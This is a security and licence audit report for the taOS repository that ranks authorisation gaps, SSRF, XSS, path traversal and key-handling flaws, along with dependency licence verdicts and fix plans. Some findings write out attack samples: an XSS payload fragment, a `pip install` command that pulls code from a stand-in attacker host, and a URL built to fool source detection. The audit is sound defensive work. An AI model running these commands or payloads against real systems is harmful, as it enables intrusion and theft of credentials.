# Library-replacement and licence audit — September 2026, pass 2

Date: 2026-09-05
Repo: jaylfc/taOS (`origin/dev`; slices A, B and `inject` audited at `9dd43cc09`, slices C, D,
`auth` and `live` at `1c3159351` — no file cited below changed between the two commits, so
every finding was re-confirmed against `1c3159351`).
Pass 1: `docs/audit/library-replacement-audit-2026-09.md` (structure, licence policy and product
constraints carried over unchanged). Pass 2 covers the areas pass 1 listed under "Not reached"
plus three dedicated security slices; it does not repeat pass-1 findings except to report their
status on HEAD.

## 0. Executive summary

- Licence: **0 new BLOCKER, 0 new FLAG.** Pass-1 B2 (`litellm-enterprise`, proprietary) is
  resolved by #2804, which inlines the `litellm[proxy]` extra minus that package.
- Security (§1, de-duplicated across seven reports): **2 Critical, 10 High, 13 Medium, 9 Low.**
  13 of 34 are PROVEN by execution; the rest are review-only with the exact sink cited.
  Five (C1–C4, M5 of the auth slice) are already being hotfixed under tsk-exyzu4 and the
  remaining un-gated routers under the P0 class card tsk-pjvwpa; they are listed, not re-carded.
- REPLACE / WRAP (§3): 35 ranked items, only **3** of which add a dependency (`pypdf`,
  `sse-starlette`, `limits` — all permissive, pure Python). The rest are delete-or-fix-in-place.
- Top-5 actions: (1) S2-1 — the notifications stored-XSS "fix" whitelisted the wrong field; the
  sink is still unescaped and now has a second attacker-reachable source; (2) S2-6 — six cluster
  routes incl. remote `pip install` on every worker have no admin gate; (3) S2-9/S2-10 — an
  agent-named trace DB escapes `data_dir`, and the LiteLLM master key sits world-readable in
  `/tmp`; (4) R2-1/R2-2/R2-3 — the cluster monitor loop dies silently, every PDF indexes empty
  (`pypdf` is imported but never declared), and every trace is lost on non-default ports;
  (5) §7 — keep LiteLLM, run it from an isolated proxy venv under `data_dir`, delete the prisma path.

## Method

| Slice | Scope | Report | Commit |
|---|---|---|---|
| A | `routes/cluster.py`, `cluster/manager.py`, `routes/agents.py`, `routes/projects.py` + `projects/events.py` (6 244 LOC read fully) | audit2/report-A | `9dd43cc09` |
| B | ingest / knowledge / skills / registry / `app.py` (12 files, ~7 700 LOC read fully) | audit2/report-B | `9dd43cc09` |
| C | LLM proxy and runtime: `llm_proxy.py`, `litellm_*`, `trace_store.py`, `otel/*`, `deployer.py`, `torrent_downloader.py`, `update_runner.py` (17 files, 6 431 LOC) | audit2/report-C | `1c3159351` |
| D | catalog content, `mac/`, `security/`, `site/`, `benchmarks/` | audit2/report-D | `1c3159351` |
| inject | injection / traversal / SSRF / deserialisation / HTML sinks / archives, whole tree | sec/report-inject | `9dd43cc09` |
| auth | route-level authorisation and multi-user isolation, proven on a throwaway instance with one admin + one member | sec/report-auth | `1c3159351` |
| live | external posture of the dev deployment (authenticated, non-destructive, ≤20 login attempts) | sec/report-live | `1c3159351` |

Rules as in pass 1: every finding cites `path:line` and is tagged **PROVEN** (executed against the
code or a throwaway instance) or **review-only**. Nothing was fixed. No production host was
touched; hosts are named by role only. Licence policy (OK / FLAG for LGPL / BLOCKER for GPL,
AGPL, proprietary and source-available) and product constraints (aarch64 wheel or pure Python,
no compile-at-install, `uv sync` installs no extras, 4 GB host runs core) are unchanged from
pass 1 §Method.

Where two reports disagreed: report-auth ranks C2 (member-triggered restart) "High → borderline
Critical"; this doc keeps **High** because it is availability-only and the brief's hotfix already
treats it with C1. The pass-2 brief listed the notifications XSS as "already fixed"; report-inject
proved it is not, and the evidence wins (S2-1). Report-A rejects `sse-starlette` for `os_events.py`
(deliberate no-`id` design) but recommends it for the projects broker; both positions are kept
because the two brokers have different contracts.

## 1. Security findings, ranked

Status column: **hotfix tsk-exyzu4** and **class card tsk-pjvwpa** mark items already being
actioned — listed for completeness, no new card. **Folds into pass-1 Sn** marks a new instance of
an already-carded pass-1 class — the pass-1 card should absorb the new site; no new card.

### Critical

| Id | Path:line | Attack | Status | Source | Fix |
|---|---|---|---|---|---|
| S2-1 | `tinyagentos/routes/notifications.py:44-48` sink; sources `routes/broker.py:63-72` (`POST /api/broker/request`, free-form `reason`) and `cluster/manager.py:403` (drain reason from a worker heartbeat, "sanitised" by a backwards `.replace` chain) | `item["title"]` / `item["message"]` are interpolated unescaped into the HTMX fragment. A `reason` of `<img src=x onerror=…>` runs in the admin's dashboard origin and can read the non-HttpOnly CSRF cookie. The two commits that closed pass-1 S1 (`95d4aa5c7`, `fdd3a9aeb`) whitelisted `level`, which was never the vector (`dict.get` at `:43`). | **PROVEN** (sink unescaped on HEAD; both sources traced; no `html.escape` in file) | inject I-1, A SA2 | `html.escape()` both fields at `:45-46`; delete the `manager.py:403` replace chain (escaping belongs at the sink). **Re-opens pass-1 S1** — carded because the S1 fix was wrong. |
| S2-2 | `tinyagentos/routes/secrets.py:70,79,89,106,121` | Any member reads the decrypted plaintext of every global secret, overwrites or deletes it. | **PROVEN** (member `GET`/`PUT`/`DELETE` → 200, admin re-read confirms) | auth C1 | Admin-gate the five CRUD routes. **hotfix tsk-exyzu4** |

### High

| Id | Path:line | Attack | Status | Source | Fix |
|---|---|---|---|---|---|
| S2-3 | `tinyagentos/routes/system.py:31` → `_do_restart` `:63` | Any member restarts the controller (`systemctl restart` / `os.execv`); repeatable = total DoS. | **PROVEN** (killed the throwaway instance) | auth C2 | Router-level admin/local-token gate as `routes/settings.py:29`. **hotfix tsk-exyzu4** |
| S2-4 | `tinyagentos/routes/providers.py:555,635,820,838,854` | Any member plants a provider + API key (routes all LLM traffic through an attacker endpoint) or deletes a legitimate one. | **PROVEN** (member `DELETE` → 200; `GET` returns key-bearing fields) | auth C3 | Admin-gate mutating provider routes. **hotfix tsk-exyzu4** |
| S2-5 | `tinyagentos/routes/mcp.py:58,67,74,83,151,184,194,208,234` | Any member starts/stops/uninstalls MCP servers, rewrites their env (credential injection) or invokes tools via `proxy_call`. | **PROVEN** (read) / review-only (mutations, identical shape) | auth C4 | Admin-gate mutating MCP routes. **hotfix tsk-exyzu4** |
| S2-6 | `tinyagentos/routes/cluster.py:1060-1093` (`POST …/workers/{name}/remote`, prefix-matched `REMOTE_EXEC_ALLOWLIST` at `:1009-1025` incl. `pip install`, `apt-get install`, `systemctl restart`); same gap on `DELETE …/workers/{name}` `:581`, `/deploy` `:1028`, `/move` `:866`, `/route` `:730` (arbitrary method+path proxied), `/promote-archived` `:1095` | Any authenticated non-admin runs `pip install --index-url http://attacker/ evil` on every worker, deletes workers, or proxies arbitrary requests to them. `revoke`/`block`/`unblock` (`:598,:629,:656`) show the gate that is missing. | review-only (predicates executed; gate absence re-confirmed on HEAD by the synthesiser) | A SA1 | `_require_admin` on all six. `cluster.py` is outside tsk-pjvwpa's enumeration (it has admin refs elsewhere), so this needs its own card; coordinate with that lane. |
| S2-7 | `tinyagentos/userspace/url_guard.py:19-60` (`POST /api/userspace-apps/install` `source_url`), `tinyagentos/projects/canvas/unfurl.py:27-37` (canvas link preview, `routes/project_canvas.py:233`, `canvas/mcp_tools.py:99`) vs the strong guard `routes/desktop_browser/ssrf.py:52-55,160-166` | Two of three SSRF guards test only `ipaddress` flags; `100.64.0.0/10` (CGNAT — where the unauthenticated A2A bus and tailnet peers live) is not `is_private`, so the controller can be made to GET into the tailnet. `unfurl` also hands the hostname back to `httpx` after the check (DNS-rebinding TOCTOU). | **PROVEN** (PoC against all three guard functions with a stubbed CGNAT answer: browser BLOCKED, install ALLOWED, unfurl ALLOWED) | inject I-2 | Promote `desktop_browser/ssrf.py` to `tinyagentos/ssrf.py`, keep `url_guard`'s IP pinning, delete the other two. **Folds into pass-1 S9** — add CGNAT + pinned-connect to its acceptance criteria. |
| S2-8 | `tinyagentos/knowledge_monitor.py:172-182` (`follow_redirects=True`, no `validate_url_or_raise`, shared `app.state.http_client`); read-back via `GET /api/knowledge/items/{id}` | A public URL that later 302s to loopback/LAN is re-fetched by the monitor and its body is stored where the submitter can read it — read-SSRF with exfil. `knowledge_ingest._download_article:297-309` already has the manual-redirect loop that should be shared. | review-only | B SB1 | Route through the shared guard with the manual-redirect loop. **Folds into pass-1 S9** (new site). |
| S2-9 | `tinyagentos/trace_store.py:138-139` (`_agent_trace_dir`) via `routes/trace.py:52,71` | Agent name from the request body is joined into `data_dir` unsanitised; `get("../../escaped-agent")` created a SQLite DB outside `data_dir`. `otel/span_store.py:38-53` has `_safe_slug` and does not use it here. | **PROVEN** | C SC1 | Apply `_safe_slug`, bind the name to `request.state.agent_name` (~10 LOC). |
| S2-10 | `tinyagentos/llm_proxy.py:93` (default `/tmp/taos-litellm`), `:173,:185,:187-197` (master key from `litellm_config.py:394`, backend keys `:263-267`, imported shim modules); `app.py:394-401` passes no config dir | The proxy config, the LiteLLM master key and every backend key are written at umask mode into a world-shared, pre-creatable `/tmp` directory; the shim `.py` files there are imported by the proxy. Unit has neither `PrivateTmp` nor `UMask`. Same pattern at `routes/system_logs.py:129` and `scripts/pre-beta-to-beta.sh:368-373`. | **PROVEN** (mode 664 on the written files) | C SC2 | `<data_dir>/litellm/` at 0700, `atomic_write_text(mode=0o600)`, `PrivateTmp=yes` + `UMask=0077` in the unit. |
| S2-11 | `tinyagentos/routes/agents.py:1002-1006` (start), `:1102-1107` (restart), `:1109-1115` (logs; `lines` unclamped into `journalctl -n`) | Start/restart/read the journal of any `taos-agent-*` container — `find_agent` is never called, so ownership is never checked. | review-only | A SA3 | Ownership via `find_agent` (not admin-only: agents are per-user); clamp `lines` to [1, 5000]. **class card tsk-pjvwpa** (`agents.py` is in its list) — the lane must scope by owner, not just admin. |
| S2-12 | `tinyagentos/app.py:1849` (`/data/workspace` `StaticFiles` mount) | Authenticated but not user-scoped: any user reads any other user's agent workspace files under predictable paths. (Unauthenticated access is refused — live slice confirmed 401.) | review-only | B SB3 | Replace the mount with a route that resolves the owner from the first path segment and applies `require_owner_or_admin`. |

### Medium

| Id | Path:line | Attack | Status | Source | Fix |
|---|---|---|---|---|---|
| S2-13 | `tinyagentos/routes/agent_model_keys.py:57` (`mint_key`; `_AGENT_ID_RE` `:34` is the only check) | A member mints a real `sk-taosagent-…` consent key naming an agent it does not own; impact conditional on `/v1` honouring the mapping. | **PROVEN** (200 with a token for a foreign agent id) | auth M5 | Resolve each `agent_id` in the registry and `require_owner_or_admin`. **hotfix tsk-exyzu4** |
| S2-14 | Routers with zero `is_admin`/`current_user` references operating on global state: `agents.py` (27 mutating verbs), `account_proxy.py` (17), `chat_admin.py` (8), `models.py`, `github_oauth.py`, `memory_management.py`, `knowledge_graph.py`, `cluster_migrate.py`, `store.py`, `tasks.py`, `agent_browsers.py`, `desktop.py` | Member enumerates and mutates global config. | **PROVEN** (reads and `POST /api/chat/channels` → 200) / review-only (other writes) | auth M6 | Default-deny: router-level dependency as `routes/settings.py:29-46`. **class card tsk-pjvwpa** |
| S2-15 | `tinyagentos/routes/cluster.py:305-347` (`GET /api/cluster/workers`), exemption `_CLUSTER_WORKERS` in `auth_middleware.py` | Unauthenticated ~53 KB inventory: every worker's LAN `url`, hardware, models, kernel/distro/version and liveness; only `signing_key` is stripped (`:319`). Maps the cluster for lateral movement and exploit selection. | **PROVEN** live on the dev host | live L-1 | Admin-gate, or return a minimal projection (`name`, `status`, `tier_id`) by extending the `:319` redaction. |
| S2-16 | `tinyagentos/themes/package.py:29,33,49`; `routes/themes.py:29` (`await package.read()`, no cap) | Zip bomb exhausts a 4 GB host; no member-count / per-member / total cap. `install_theme` also trusts `manifest["id"]` without the route's own `_THEME_ID_RE` (`routes/themes.py:13`); `:46` uses the fragile AND-form instead of `userspace/package.py:24-27,132-143`'s `is_relative_to`. | review-only (unfixed on HEAD) | inject I-3 | Copy the `userspace/package.py` `infolist()` pre-check; run `_THEME_ID_RE` on the manifest id. **Folds into pass-1 S7.** |
| S2-17 | `tinyagentos/routes/settings.py:308-331` (`restore_backup`, manual `extractfile().read()` loop) | Gzip bomb writes unbounded into `data_dir` (traversal is handled at `:323`). | review-only (unfixed on HEAD) | inject I-4 | Cumulative-byte cap; prefer `filter="data"` as `desktop_rebuild.py:169`. **Folds into pass-1 S7.** |
| S2-18 | `tinyagentos/routes/agents.py:1146-1151`, `:1195-1226` (import) | Caller-supplied dict is persisted verbatim into `config.yaml`: can set `can_read_user_memory`, `permitted_models`, `llm_key`, `registry_canonical_id`; name is never slugified ("My Agent" → an unmanageable container). | review-only | A SA4 | Pydantic import model with an explicit field allowlist + slugify; drop privileged keys. Independent of tsk-pjvwpa (admin import of a third-party bundle is the use case). |
| S2-19 | `tinyagentos/knowledge_monitor.py:179` (`resp.text`), `tinyagentos/knowledge_ingest.py:311-312` | No size cap or content-type gate on fetched bodies (contrast `library_pipeline.WebProcessor` `_MAX_WEB_BYTES` `:467,:503-527`) — one URL OOMs a 4 GB host. | review-only | B SB2 | Stream with the `_MAX_WEB_BYTES` cap and a `text/html` gate; share the helper with S2-8. |
| S2-20 | `tinyagentos/auth_middleware.py:618-633` | Any valid local token — including per-agent local tokens (`get_local_token_agent`) — maps to the primary admin. Turns S2-9 into an admin-context write. | review-only (design) | C SC7 | Design-level; belongs to the agent-identity programme, not a lane card. Carry to pass 3. |
| S2-21 | `app-catalog/services/linkwarden/manifest.yaml:21-24` | Static `NEXTAUTH_SECRET: "changeme"` on every install; `DATABASE_URL` points at a Postgres the manifest never starts. | review-only | D S3 | Use `{secret_key}` (provisioned by `docker_installer.py:22-85`); add the Postgres service or drop the URL. |
| S2-22 | `app-catalog/streaming/code-server/Dockerfile:24`, `app-catalog/agents/openclaw/scripts/install.sh:40,59`, `app-catalog/agents/deer-flow/scripts/install.sh:21,44` | Un-hashed `curl … | sh` at build/install time — remote code with no integrity check. | review-only | D S4 | Pin by SHA-256 as the moltis/picoclaw scripts already do. |
| S2-23 | `mac/build/*.sh` (no script fetches Sparkle → `#if canImport(Sparkle)` false at `SparkleBridge.swift:3,11,35,44`); feed host `taos.app` in `Info.plist.in:29`, `mac/appcast/appcast.xml:5`, `sparkle_sign.sh:57` (project domain is `taos.my`) | Every shipped Mac build has a no-op updater, so security fixes never reach users; if `taos.app` is not owned, whoever registers it receives a daily beacon and can deny updates (EdDSA prevents forging them). | review-only (canImport gate read; domain ownership not verified) | D S1, S2 | Verify domain ownership first; move the feed to the project domain; add `fetch_sparkle.sh` pinned to the checksum in `Package.swift:13-14`; `assemble_bundle.sh:101` must fail a release build without it. |
| S2-24 | `tinyagentos/cluster/manager.py:528-539` (`_worker_for_resource`), heartbeat `:519` | A worker can fabricate unlimited leases (resource half unvalidated) with a 24 h TTL — memory growth from a compromised or buggy worker. | review-only | A Z10 | Validate the resource half against the worker's registered capabilities. |
| S2-25 | `tinyagentos/routes/skills.py:41-44` + `skills.py:874-880` | Any `skill_id` is accepted and 200 returned — no FK — so junk grants accumulate. Integrity, not confidentiality. | review-only | B SB4 | Validate against the seeded id set; 404 otherwise. |

### Low

| Id | Path:line | Defect | Status | Source | Fix |
|---|---|---|---|---|---|
| S2-26 | `tinyagentos/litellm_auth.py:90-92`; `tinyagentos/routes/agents.py:206` | Master key / `llm_key` compared with `==` (timing). | review-only | C SC4, A SA6 | `secrets.compare_digest` at both sites (§4). |
| S2-27 | `tinyagentos/torrent_downloader.py:193` | Sync `httpx.get(follow_redirects=True)` with no guard or size cap — fourth pass-1 S9 site; also blocks the event loop. | review-only | C SC5 | **Folds into pass-1 S9**; the sync call is §4. |
| S2-28 | `tinyagentos/opencode_runtime.py:193-197,249-253` | `write_text` then `chmod` — brief world-readable window for key material. | review-only | C SC6 | `atomic_write_text(mode=0o600)`. |
| S2-29 | `tinyagentos/auth.py:1028` (`validate_session`) | UA binding is checked only when the request carries a UA; a replayed token with no header skips it. | review-only | auth L7 | Missing UA = mismatch when a hash was stored. |
| S2-30 | `tinyagentos/auth.py:937` (`change_password`) | Other sessions survive a self password change (contrast `admin_reset_password`). | review-only | auth L8 | Revoke all but the current session. |
| S2-31 | `tinyagentos/middleware/security_headers.py:67-74` | No `Referrer-Policy`, no `Permissions-Policy`; dev deployment is plaintext HTTP (no HSTS possible). | **PROVEN** live | live L-2 | Add both headers; HSTS once fronted by TLS. |
| S2-32 | `tinyagentos/middleware/version_header.py:14-16`; `Server: uvicorn` banner | Exact build fingerprint to unauthenticated callers. | **PROVEN** live | live L-3 | Drop the `Server` banner; coarsen the version for unauthenticated requests. |
| S2-33 | `tinyagentos/routes/manifest.py:27` | Raw FastAPI 422 schema leaked unauthenticated. | review-only | live L-4 | Default/validate `app`, return a plain 400. |
| S2-34 | `security/pip-audit-ignore.toml:10-13`; `scripts/check_dependency_audit_ignores.py:136-176` | CVE-2026-3219 ignore is dead (pip ≥ 26.1 installed by the workflow) and the checker cannot flag a stale ignore, so the file's own header claim is false. | review-only | D S5 | Teach the checker "ignored CVE no longer reported → fail" (~6 lines). |

Checked and clean (positive controls, all from the reports): no `pickle`/`yaml.load`/`eval` on
untrusted data anywhere; every f-string SQL interpolation is an allowlisted column/table; file
routes use `.resolve()` + `is_relative_to`; `auth.py` and `project_invites._invite_html` escape
correctly; the login limiter really returns 429 at attempt 5; `/docs`, `/openapi.json`, `/.git/config`
and `/.env` are 401; a registry JWT is refused on every non-allowlisted route; per-user document
stores (notes, todo, knowledge, projects, decisions, shares) have no IDOR.

## 2. Licence verdicts

No new BLOCKER or FLAG in pass 2. Every library recommended in §3 is permissive (table in §3).

| Item | Verdict | Note |
|---|---|---|
| Pass-1 B2 `litellm-enterprise` (LicenseRef-Proprietary, 0.1.64 on the index) | **RESOLVED by #2804** | The `litellm[proxy]` extra is inlined minus that package; report-C re-verified the remaining 31 pins are MIT/BSD/Apache. |
| `litellm` 1.99.0 | OK (MIT) | Compiled wheels only since 1.93 — `manylinux_2_28_aarch64`, cp310-abi3; verified on the index 2026-09-01. |
| `litellm-proxy-extras` 0.4.93 | OK (MIT) | Pulled by the inlined list. |
| `prisma` 0.15.0 | OK (Apache-2.0) but **stale** (last release 2024-08-16) and downloads an engine at runtime | Delete with the Postgres path (§7, R2-18). |
| `mkdocs-exclude` 1.0.2 | OK (Apache-2.0) but unmaintained since 2019 | Replace with native `exclude_docs:` (R2-33). |
| `yt-dlp` 2026.8.19 | OK (Unlicense) | Keep optional; never a core dependency (R2-15). |
| App-catalog GPL/AGPL services (n8n Sustainable Use, hailo-ollama proprietary) | OK | Declared in their manifests and pulled at install time, not shipped. |
| LongMemEval fixtures under `benchmarks/` (14.7 MB JSON) | **unverified** | Licence not established; moot if R2-31 deletes the directory. |

## 3. Ranked REPLACE / WRAP list

Ranked by product impact. "Library" is the verified package where one is proposed; "none" means
fix in place. LOC is net removed (−) or added (+). All three proposed packages were verified on
the index by the slice reports: `pypdf` 6.17.0 BSD-3-Clause, pure Python, 379 KiB, released
2026-09-04; `sse-starlette` 3.4.10 BSD-3-Clause, pure Python, deps already installed;
`limits` 5.8.0 MIT, pure Python.

| # | Area | Current code | Concrete defect / win | Library (SPDX, aarch64) | LOC | Risk | Effort | Verdict |
|---|---|---|---|---|---|---|---|---|
| R2-1 | Cluster liveness | `cluster/manager.py:986-1183` `_monitor_loop`, unguarded `emit_event` at `:1061,:1109,:1155`; `_monitor_task` `:82` has no done-callback | One DB error ends liveness, lease sweep and the split-brain fence forever, silently. Highest-severity reliability defect in slice A. | none | +15 | low | S | **FIX** (card) |
| R2-2 | PDF ingest | `library_pipeline.py:213-261` imports `pypdf` | Declared nowhere (PROVEN absent from `pyproject`, `uv.lock`, scripts, venv) → every PDF indexes empty and is marked ready. | `pypdf` 6.17.0 (BSD-3, pure) | +1 dep | low | S | **ADD** (card) |
| R2-3 | Tracing | `litellm_callback.py:81-82` hard-wires `:6969`; `llm_proxy.py:444-482` never exports `TAOS_TRACE_URL` | All traces, lifecycle and spend are lost on the Mac app (7117) and custom-port installs (PROVEN with `TAOS_PORT=7117`). | none | +6 | low | S | **FIX** (card) |
| R2-4 | Data dir | `app.py:172` ignores `TAOS_DATA_DIR`; `recover-password` `:1893` honours it (PROVEN mismatch); own resolution in `taosnet/mesh_credentials.py:49`, `hub/identity.py:63`, `hub/store.py:209`, `peer.py:321`, `routes/chat.py:348` | Password reset lands in a directory the server never reads and prints success. | none | −30 | medium (needs a migration or explicit refusal when the two disagree) | M | **FIX** (card) |
| R2-5 | Projects SSE | `routes/projects.py:1566-1597`, `projects/events.py:30-41`, `desktop/src/apps/projects/useBoardLive.ts:16` | Second unbounded broker (PROVEN 200 000 queued); replays 32 events on every reconnect with no `id:` (`:1587`); no client dedupe (`projects.ts:453-455`); LIVE badge hard-coded true. | `sse-starlette` 3.4.10 (BSD-3, pure) or in-place | −40 | low | M | **WRAP** (card) |
| R2-6 | Agent idempotency | `routes/agents.py:44-157` `IdempotencyCache.release()` | Leaves `result=None` so a retry gets 503 for 3 600 s (PROVEN); caches the body only, so an error replays as 200. | none | ±6 | low | S | **FIX** (card) |
| R2-7 | Knowledge search | `knowledge_store.py:238-241` `INSERT OR REPLACE` into a standalone FTS5 table | Plain INSERT on FTS5 → duplicate rows, stale content stays searchable (PROVEN 3 rows). | none | +12 | low | M | **FIX** (card) |
| R2-8 | Knowledge summary | `knowledge_ingest.py:339-346` POSTs `{base}/generate`; `knowledge_categories.py:113-120` POSTs the base URL | Endpoints no backend serves; failures swallowed → empty summary and categories, item marked ready. | none (route through `LLMProxy`) | −20 | low | M | **FIX** (card) |
| R2-9 | Judge | `otel/judge.py:117-118` default key `taos-internal`; `app.py:1151` passes only the base URL | Always 401 → judge dead since introduction. | none | +4 | low | S | **FIX** (card) |
| R2-10 | Trace store | `trace_store.py:440` `list()` | Caches a connection + thread per bucket (PROVEN 40 connections / 41 threads after listing). | none | +8 | low | S | **FIX** (card) |
| R2-11 | Proxy restart | `llm_proxy.py:47-69` `lsof -ti :{port}`, `:386-407` kills every pid | Returns clients too — kills the incus forkproxy (`deployer.py:497-516`) (PROVEN). | none | +1 (`-sTCP:LISTEN`) | low | S | **FIX** (card) |
| R2-12 | Knowledge monitor | `knowledge_monitor.py:104` (`limit` 50), `:128,:153` (sha256("") baseline on failed fetch), `:139-140` (raw HTML overwrites extracted text, decay reset), `:20-52` (inert `stop_after_days`) | Items 51+ are never polled; first poll destroys the extracted text. | none | ±20 | low | S | **FIX** (card) |
| R2-13 | Readability | `knowledge_ingest.py:56-69` self-declared stub; `library_pipeline._extract_readable_text:699-708`; `:707` `len >= 100` | `readability-lxml` is a core dep and unused here; regex `<[^>]+>` breaks on `>` in attributes (PROVEN); neither path unescapes entities; short articles discarded. | none (use the declared dep) | −25 | low | S | **FIX** (card) |
| R2-14 | Source resolution | `knowledge_ingest.py:39-53` `resolve_source_type`; `knowledge_fetchers/github.py:25-26` `_auth_headers(None)` → `Bearer None`; `parse_github_url` no host check | `evil.com/?x=youtu.be/abc` → youtube, `gitlab.com/...` → GitHub owner (PROVEN); GitHub source fails on every install without a token (PROVEN). | none (`urlsplit().hostname`) | +10 | low | S | **FIX** (card) |
| R2-15 | yt-dlp | `knowledge_fetchers/youtube.py:18,140,151,178,196,218-220,233,266`, `x.py:44-58,293-294` | Bare-name subprocess not on the systemd PATH; `x.py:58` returns None → silent ready; `--dump-json` multi-line parsed as one doc; decode without `errors=`; `_tracked_procs` never shrinks and `_cleanup_procs` kills across requests; three invocations per video; thumbnail assumed PNG. | `yt-dlp` stays optional (Unlicense) | ±40 | low | M | **FIX** (card) |
| R2-16 | Reddit | `knowledge_fetchers/reddit.py:83-119,326-333`, `:101-106` | Unbounded recursion (PROVEN RecursionError at depth 1 200); `edited=True` → `1.0` timestamp (PROVEN). | none | +8 | low | S | **FIX** (card) |
| R2-17 | Updater | `update_runner.py:54-63` `_run` no timeout; `:122,:129-131` ignore rc; `:112-160` dead `update_to_master` with `git reset --hard` | Twin of pass-1 R16; a hung git blocks the updater forever. | none | −60 | low | S | **DELETE** (card) |
| R2-18 | LiteLLM Postgres | `litellm_migrate.py:136-142` `prisma generate` (no timeout, downloads an engine at runtime); `prisma` 0.15.0 stale | Only needed for `/key/*` in Postgres mode, which taOS does not run. | delete `prisma` | −150 | low | M | **DELETE** (card; §7) |
| R2-19 | Checksums | `torrent_downloader.py:304`, `download_manager.py:174` `sha256(read_bytes())` | Whole multi-GB model file in RAM on a 4 GB host. | none (`hashlib.file_digest`) | ±2 each | low | S | **FIX** (card) |
| R2-20 | X watches | `knowledge_fetchers/x.py:226-372` `XWatchStore` | Sync sqlite on the event loop; CWD-relative `data/x-watches.db`; `app.state.x_watch_store` never set; no `user_id`. | none (`BaseStore`) | −60 | low | M | **FIX** (card) |
| R2-21 | Agent budgets | `routes/agents.py:1578-1582` (store built per request, DDL each time), `:1598,:1620,:1633` sync sqlite on the loop | Latency and lock contention on every budget call. | none (lifespan + `to_thread`) | ±15 | low | S | **FIX** (card) |
| R2-22 | Agent self-service | `routes/agents.py:209-241` | Unreachable with a LiteLLM key: middleware 401s first (PROVEN `_is_exempt` False, not in `_AGENT_TOKEN_PATHS`); the test bypasses the middleware. | none | +5 | low | S | **FIX** (card) |
| R2-23 | Task validation | `routes/projects.py:776-788` any `status`; `UpdateTaskIn.status` `:506`; `:1506-1523` `direction` → ValueError → 500 (PROVEN) | Bogus status makes a card vanish from the board. | none (`StrEnum`, `Literal`) | ±10 | low | S | **FIX** (card) |
| R2-24 | Fleet update | `routes/cluster.py:1484-1574` update-all | Holds the HTTP request up to n × 300 s. | none (202 + job id) | +30 | low | M | **FIX** (card) |
| R2-25 | Task lifetimes | `cluster/manager.py:416-424,453-461,84-90`; `routes/agents.py:852` `_background_deploy` | Fire-and-forget tasks can be GC'd (agent stuck "deploying"); `stop()` never drains `_background_tasks`. | none | +12 | low | S | **FIX** (card) |
| R2-26 | Chunking | `knowledge_ingest.py:355-376` | 2 000-char slices, no overlap, orphaned chunks on re-embed, per-chunk failure swallowed → ready. | none (keep hand-rolled) | ±15 | low | S | **FIX** (card) |
| R2-27 | File typing | `library_pipeline.py:26-83` second ext map beside the imported `mimetypes` | `.py/.yaml/.md/.log` → `FileProcessor`, no text extracted. | none | −30 | low | S | **FIX** (card) |
| R2-28 | Registry keypair | `agent_registry_store.py:282-297` | Non-atomic create-then-write; a concurrent reader sees an empty key file → boot failure. `filelock` is now a core dep (`pyproject.toml:52`). | none (`atomic_io` + `filelock`) | ±8 | low | S | **FIX** (card) |
| R2-29 | Proxy startup | `llm_proxy.py:507-518` readiness poll without `proc.poll()`; `:488-489` stderr log never closed or rotated | 120 s wait on a crashed proxy; unbounded log. | none | +6 | low | S | **FIX** (card) |
| R2-30 | Restart orchestrator | `restart_orchestrator.py:47,202` non-atomic writes; `:229-243` flag never cleared when `current_sha == ""` | Stale restart flag survives; torn file on power loss (host has a writeback-corruption history). | none (`atomic_io`) | ±6 | low | S | **FIX** (card) |
| R2-31 | Benchmarks | `benchmarks/*.py` (2 481 LOC + 14.7 MB JSON) | Every script imports modules that do not exist (PROVEN); fixture licence unverified. | delete | −2 481 | low | S | **DELETE** (card) |
| R2-32 | Streaming tier | `app-catalog/streaming/` (12 of 13 Dockerfiles are stubs); `registry.py:155-191` never loads the tier (PROVEN `streaming-app` count 0) | Dead catalogue content shipped in every release. | delete or finish | −? | low | M | **DELETE** (card) |
| R2-33 | Docs site | `site/docs/mkdocs.yml:94-102` `mkdocs-exclude` 1.0.2 (2019) | Native `exclude_docs:` has existed since mkdocs 1.5. `mkdocs-material` 9.7.7 MIT — keep. | drop 1 dep | −1 dep | low | S | **REPLACE** (card) |
| R2-34 | Catalog ports | `requires.ports` ↔ `install.ports` duplicated across 27 services; `docker_installer.py:132` dead branch, `:134` crashes on `"6333:6333"` (PROVEN; qdrant uninstallable) | Two sources of truth, one crash. | none | −40 | low | S | **FIX** (card) |
| R2-35 | Rate limiting | `routes/cluster.py:39-55` `_manual_claim_hits` — fifth hand-rolled limiter (unbounded dict, fixed window, no `Retry-After`, `request.client.host` collapses behind a proxy; route is unauthenticated) | Same class as pass-1 S5. | `limits` 5.8.0 (MIT, pure) if S5 adopts a library; otherwise backport `peer.py`'s eviction | −15 | low | S | **Folds into pass-1 S5** — no new card |

## 4. Zero-dependency quick fixes

Grouped by the PR that would carry them; one card per group (priority 5) where a concrete
defect exists.

### 4.1 Security hygiene (card Q2-1)

| Fix | Where | Why |
|---|---|---|
| `secrets.compare_digest` | `litellm_auth.py:90-92`, `routes/agents.py:206` | S2-26 timing compare. |
| `atomic_write_text(mode=0o600)` | `opencode_runtime.py:193-197,249-253` | S2-28 chmod window. |
| Move the sync `httpx.get` off the loop and behind the shared guard | `torrent_downloader.py:193` | S2-27; the guard half lands with S9. |
| Column allowlist on `f"{k} = ?"` | `knowledge_store.py:223-224` | Not exploitable today (all 24 callers are literals); one `frozenset` closes the class. |
| Escape LIKE metacharacters | `knowledge_store.py:366` | `%`/`_` in a user query match everything. |

### 4.2 Cluster manager hardening (card Q2-2)

| Fix | Where | Why |
|---|---|---|
| Guard `_format_hw` | `cluster/manager.py:30-39`; heartbeat `:519` | Worker-supplied non-int `ram`/`vram` raises TypeError inside the heartbeat handler. |
| Validate the resource half | `cluster/manager.py:528-539` | S2-24 fabricated leases. |
| `_ever_seen.add` after the guards | `cluster/manager.py:104-123` (`:109`) | A rejected stale-generation registration suppresses the `worker.join` notification (PROVEN). |
| `app.state.notifications`, not `notif_store` | `routes/cluster.py:481` | Attribute never assigned → the notification never fires. One word. |
| Drain `_background_tasks` in `stop()` | `cluster/manager.py:84-90` | R2-25. |

### 4.3 Projects router nits (card Q2-3)

| Fix | Where | Why |
|---|---|---|
| Bad slug → 400 not 409 | `routes/projects.py:1694` | Wrong status class. |
| Add `_TaskRequestModelMixin` to `CreateChecklistItemIn` | `routes/projects.py:1384` | Only request model without the mixin. |
| One `_SLUG_RE` | `routes/projects.py:32`, `projects/element_store.py:49,89-94` | Defined three times. |
| `delete_element` `mode` as `Literal` | `routes/projects.py:1823` | Unvalidated free string. |
